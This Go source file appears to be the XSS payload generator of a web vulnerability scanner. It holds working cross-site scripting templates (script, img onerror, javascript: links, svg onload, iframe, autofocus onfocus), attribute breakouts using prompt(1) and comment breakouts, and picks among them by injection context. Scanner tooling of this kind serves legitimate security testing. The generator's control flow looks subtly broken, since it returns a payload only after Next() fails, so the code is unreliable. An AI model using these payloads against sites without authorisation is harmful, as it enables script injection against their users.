package Xss

import (
	"fmt"
	"math/rand"
	"net/url"
	"strings"
	"time"
	"wenscan/Helper"
	log "wenscan/Log"

	"github.com/thoas/go-funk"
)

type Xss struct {
	RawString string
	Url       *url.URL
	Query     *url.Values
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

var (
	htmlmode = 1
	comment  = 2
	attibute = 3
)

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

var (
	script_payload string = "<ScRiPt>%s</sCrIpT>"
	img_payload    string = "<iMg SrC=1 oNeRrOr=%s>"
	href_payload   string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
	svg_payload    string = "<sVg/OnLoAd=%s>"
	iframe_payload string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
	input_payload  string = "<input autofocus onfocus=%s>"
)

var (
	flag_tag1       string = "'><%s>//"
	flag_tag2       string = "\"><%s>//"
	flag_tag3       string = " ><%s>// "
	flag_Attibutes1 string = "'%s=prompt(1)'"
	flag_Attibutes2 string = "\"%s=prompt(1)\""
	flag_Attibutes3 string = " %s=prompt(1) "
)

var (
	comment_payload1 string = "--><%s>"
	comment_payload2 string = "--!><%s>"
)

type Generator struct {
	words []string
	i     int
	value string
}

func (g *Generator) Next() bool {
	if g.i == len(g.words) {
		return false
	}
	g.value = g.words[g.i]
	g.i++
	return true
}

func (g *Generator) Value() interface{} {
	return g.value
}

//CheckHtmlNodeAttributesKey 检测是否存在对应的key值
func CheckHtmlNodeAttributesKey(s Helper.Occurence, key string) bool {
	c := funk.Map(*s.Details.Attributes, func(A Helper.Attribute) bool {
		if A.Key == key {
			return true
		}
		return false
	})
	if funk.Contains(c, true) {
		return true
	}
	return false
}

func Test_CheckHtmlNodeAttributesKey() {
	detail := Helper.Node{Tagname: "attibute", Content: "key", Attributes: &[]Helper.Attribute{{Key: "srcdoc", Val: "dsadsadadsa"}}}
	test := Helper.Occurence{Details: detail}
	if CheckHtmlNodeAttributesKey(test, "srcdoc") {
		log.Debug("ok")
	}
}

//GeneratorPayload 生成payload
func (g *Generator) GeneratorPayload(mode int, flag string, extension interface{}) string {
	if htmlmode == mode {
		htmlpayload := []string{script_payload, img_payload, href_payload, svg_payload, iframe_payload, input_payload}
		g.words = append(g.words, htmlpayload...)
		if !g.Next() {
			switch s := g.Value().(type) {
			case string:
				return fmt.Sprintf(s, flag)
			}
		}
	} else if comment == mode {
		commentpayload := []string{comment_payload1, comment_payload2}
		g.words = append(g.words, commentpayload...)
		if !g.Next() {
			switch s := g.Value().(type) {
			case string:
				return fmt.Sprintf(s, flag)
			}
		}
	} else if attibute == mode {
		switch s := extension.(type) {
		case Helper.Occurence:

			if funk.Contains(s.Type, "key") {
				KeyPayload := []string{script_payload, img_payload, href_payload, svg_payload, iframe_payload, input_payload}
				g.words = append(g.words, KeyPayload...)
				if !g.Next() {
					switch v := g.Value().(type) {
					case string:
						return fmt.Sprintf(v, flag)
					}
				}
			} else if funk.Contains(s.Type, "value") {
				if CheckHtmlNodeAttributesKey(s, "srcdoc") {
					//替换'<'和'>'为 url 编码
					ValuePayload := []string{script_payload, img_payload, href_payload, svg_payload, iframe_payload, input_payload}
					newValuePayload := funk.Map(ValuePayload, func(payload string) string {
						Lstr := strings.Replace(payload, "<", "%26lt;", -1)
						Rstr := strings.Replace(Lstr, ">", "%26gt;", -1)
						return Rstr
					})
					switch v := newValuePayload.(type) {
					case []string:
						g.words = append(g.words, v...)
						if !g.Next() {
							switch v := g.Value().(type) {
							case string:
								return fmt.Sprintf(v, flag)
							}
						}
					}
				}
				ValuePayload := []string{flag_tag1, flag_tag2, flag_tag3, flag_Attibutes1, flag_Attibutes2, flag_Attibutes3}
				g.words = append(g.words, ValuePayload...)
				if !g.Next() {
					switch v := g.Value().(type) {
					case string:
						return fmt.Sprintf(v, flag)
					}
				}
			}
		}

	}
	return ""
}
